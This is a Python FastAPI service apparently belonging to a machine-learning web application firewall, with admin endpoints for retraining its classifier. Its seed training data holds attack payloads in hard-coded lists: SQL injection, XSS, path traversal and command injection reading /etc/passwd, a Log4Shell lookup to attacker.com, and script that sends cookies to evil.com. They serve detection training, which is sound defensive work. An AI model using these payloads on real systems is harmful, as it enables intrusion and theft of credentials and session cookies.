import asyncio
import json
from typing import Optional

from fastapi import Depends, FastAPI, Header, HTTPException, Request
from loguru import logger
from pydantic import BaseModel

from src.models.head_trainer import retrain_head
from src.models.transformer import load_waf_model
from src.storage.db import Database, get_db
from src.utils.audit import audit, fingerprint_secret
from src.utils.config import get_settings
from src.utils.logger import setup_logger
from src.utils.request_context import get_request_id, sanitize_request_id, set_request_id

setup_logger()

app = FastAPI(title="WAF Update API", version="1.0.0")
settings = get_settings()


@app.middleware("http")
async def request_context_middleware(request: Request, call_next):
    request_id = sanitize_request_id(request.headers.get("x-request-id"))
    set_request_id(request_id)
    response = await call_next(request)
    response.headers["X-Request-ID"] = request_id
    response.headers.setdefault("X-Content-Type-Options", "nosniff")
    response.headers.setdefault("X-Frame-Options", "DENY")
    return response

_model = None
_state: dict = {"status": "idle", "epoch": 0}
_lock = asyncio.Lock()

# Curated seed set so retraining still has both classes even before the
# operator has uploaded any samples.  The benign seeds cover the exact kinds
# of normal traffic (JSON, SOAP, multipart, JWT, C++) that a classifier
# trained mostly on simple GETs tends to over-block.
SEED_BENIGN = [
    "GET /products/search?q=wireless+headphones&sort=price_asc HTTP/1.1\nHost: shop.example.com\nUser-Agent: Mozilla/5.0\n",
    "POST /api/login HTTP/1.1\nHost: app.example.com\nContent-Type: application/json\n\n{\"username\":\"nikhil\",\"password\":\"Passw0rd!\"}",
    "POST /api/login HTTP/1.1\nHost: app.example.com\nContent-Type: application/json\n\n{\"email\":\"user@example.com\",\"password\":\"MyS3cur3P@ss!\",\"remember\":true}",
    "PUT /api/orders/8891 HTTP/1.1\nHost: api.example.com\nContent-Type: application/json\n\n{\"status\":\"shipped\",\"note\":\"Deliver after 5pm\"}",
    "PUT /api/v1/users/me HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.payload.sig\nContent-Type: application/json\n\n{\"display_name\":\"Nikhil Gupta\",\"bio\":\"I love <b>security</b> & coding\"}",
    "POST /soap HTTP/1.1\nHost: api.example.com\nContent-Type: text/xml\n\n<?xml version=\"1.0\"?><Envelope><Body><GetUser><id>42</id></GetUser></Body></Envelope>",
    "POST /api/upload HTTP/1.1\nHost: app.example.com\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary\n\n------WebKitFormBoundary\nContent-Disposition: form-data; name=\"file\"; filename=\"report.pdf\"\nContent-Type: application/pdf\n\n%PDF-1.7 ...binary...\n------WebKitFormBoundary--",
    "GET /search?q=C%2B%2B+programming&page=2 HTTP/1.1\nHost: site.example.com\nUser-Agent: Mozilla/5.0\n",
    "POST /graphql HTTP/1.1\nHost: api.example.com\nContent-Type: application/json\n\n{\"query\":\"query { user(id: 42) { name email } }\"}",
    "GET /search?q=women's+shoes HTTP/1.1\nHost: shop.example.com\nUser-Agent: Mozilla/5.0\n",
    "GET /admin/dashboard?range=30d&tab=users HTTP/1.1\nHost: corp.example.com\nCookie: sid=abc123; theme=dark\n",
    "GET /files/download?name=quarterly-report-2026.pdf HTTP/1.1\nHost: files.example.com\nRange: bytes=0-1023\n",
]

SEED_ATTACKS = [
    "GET /?id=1%27%20OR%20%271%27%3D%271 HTTP/1.1\nHost: x.com\n",
    "GET /item?id=1%20UNION%20SELECT%20null,password,3%20FROM%20users-- HTTP/1.1\nHost: x.com\n",
    "GET /?q=<script>alert(document.cookie)</script> HTTP/1.1\nHost: x.com\n",
    "GET /?q=<img src=x onerror=alert(1)> HTTP/1.1\nHost: x.com\n",
    "GET /files/download?file=../../../../../../etc/passwd HTTP/1.1\nHost: x.com\n",
    "GET /network/ping?host=127.0.0.1;cat%20/etc/passwd HTTP/1.1\nHost: x.com\n",
    "POST /api/v1/auth/login HTTP/1.1\nHost: x.com\nUser-Agent: ${jndi:ldap://attacker.com/exploit}\n\n{\"user\":\"admin\"}",
    "POST /helloworld HTTP/1.1\nHost: x.com\nContent-Type: application/x-www-form-urlencoded\n\nclass.module.classLoader.resources.context.parent.pipeline.first.pattern=evil",
    "GET /?name={{7*7}} HTTP/1.1\nHost: x.com\n",
    "GET /fetch?url=http://127.0.0.1:6379/ HTTP/1.1\nHost: x.com\n",
    "POST /comments/new HTTP/1.1\nHost: x.com\n\n<script>fetch('http://evil.com/?c='+document.cookie)</script>",
    "POST /api/login HTTP/1.1\nHost: x.com\nContent-Type: application/json\n\n{\"username\":\"admin'--\",\"password\":\"x\"}",
]


def get_model():
    global _model
    if _model is None:
        _model = load_waf_model()
        _model.eval()
    return _model


async def verify_admin_key(x_api_key: str = Header(default="")):
    if settings.update_api.api_keys and x_api_key not in settings.update_api.api_keys:
        raise HTTPException(status_code=401, detail="Invalid admin API key")
    return x_api_key


class RetrainRequest(BaseModel):
    epochs: Optional[int] = None
    learning_rate: Optional[float] = None


class AddBenignDataRequest(BaseModel):
    requests: list[dict]


def _raw_from_stored(sample: dict) -> str:
    raw = sample.get("raw_request", "")
    if not raw:
        return ""
    try:
        data = json.loads(raw)
    except Exception:
        return raw
    if not isinstance(data, dict):
        return raw
    method = data.get("method", "GET")
    path = data.get("path", "/")
    headers = data.get("headers", {}) or {}
    body = data.get("body", "") or ""
    header_text = "\n".join(f"{k}: {v}" for k, v in headers.items())
    return f"{method} {path} HTTP/1.1\n{header_text}\n\n{body}".strip()


async def _run_retrain(benign: list[str], attacks: list[str], epochs: int, lr: float) -> None:
    global _state
    _state = {"status": "training", "benign": len(benign), "attacks": len(attacks)}
    try:
        model = await asyncio.to_thread(get_model)
        result = await asyncio.to_thread(
            retrain_head, model, benign, attacks, epochs, lr
        )
        _state = result
    except Exception as exc:
        logger.exception("Retraining failed")
        _state = {"status": "error", "message": str(exc)}


@app.post("/retrain")
async def retrain(
    body: RetrainRequest,
    request: Request,
    api_key: str = Depends(verify_admin_key),
    db: Database = Depends(get_db),
):
    async with _lock:
        if _state.get("status") == "training":
            raise HTTPException(status_code=409, detail="Training already in progress")

        stored = db.get_training_samples(label="benign")
        stored_texts = [text for text in (_raw_from_stored(s) for s in stored) if text]
        benign = SEED_BENIGN + stored_texts
        attacks = list(SEED_ATTACKS)

        asyncio.create_task(
            _run_retrain(
                benign,
                attacks,
                epochs=body.epochs or 40,
                lr=body.learning_rate or 0.02,
            )
        )

    audit(
        "model.retrain",
        actor=f"key:{fingerprint_secret(api_key)}",
        request_id=get_request_id(),
        source_ip=request.client.host if request.client else "",
        details={"benign": len(benign), "attacks": len(attacks), "epochs": body.epochs or 40},
    )
    return {
        "status": "training_started",
        "benign_samples": len(benign),
        "attack_samples": len(attacks),
        "epochs": body.epochs or 40,
    }


@app.get("/retrain/status")
async def retrain_status(api_key: str = Depends(verify_admin_key)):
    return _state


@app.post("/add_benign_data")
async def add_benign_data(
    body: AddBenignDataRequest,
    request: Request,
    api_key: str = Depends(verify_admin_key),
    db: Database = Depends(get_db),
):
    added = 0
    for req in body.requests:
        try:
            raw = json.dumps(req) if isinstance(req, dict) else str(req)
            db.add_training_sample(raw_request=raw, label="benign")
            added += 1
        except Exception as exc:
            logger.warning("Failed to add sample: {}", exc)

    logger.info("Added {} benign training samples", added)
    audit(
        "model.add_benign_data",
        actor=f"key:{fingerprint_secret(api_key)}",
        request_id=get_request_id(),
        source_ip=request.client.host if request.client else "",
        details={"added": added, "submitted": len(body.requests)},
    )
    return {"added": added, "total_submitted": len(body.requests)}


@app.get("/health")
async def health():
    return {"status": "healthy", "service": "update-api"}


if __name__ == "__main__":
    import uvicorn

    uvicorn.run(app, host=settings.update_api.host, port=settings.update_api.port)
